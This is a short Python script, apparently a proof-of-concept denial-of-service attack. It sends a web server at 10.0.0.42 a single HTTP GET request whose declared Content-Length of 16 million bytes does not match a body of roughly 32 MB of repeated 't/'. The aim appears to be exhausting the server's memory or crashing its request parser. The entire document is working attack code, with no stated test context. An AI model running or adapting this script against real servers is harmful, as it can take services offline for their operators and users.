#!/usr/bin/python3
import socket	#for sockets
import sys	#for exit

remote_ip = '10.0.0.42'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((remote_ip , port))

payload="t/" * 16000000

#Send some data to remote server
message = str.encode("GET / HTTP/1.1\r\nContent-Length: 16000000\r\n\r\n%s" % payload)

#print("SENDING >>> " + str(message))
try :
	#Set the whole string
	s.sendall(message)
except socket.error:
	#Send failed
	print('Send failed')
	sys.exit()

data = s.recv(512)
print(data)
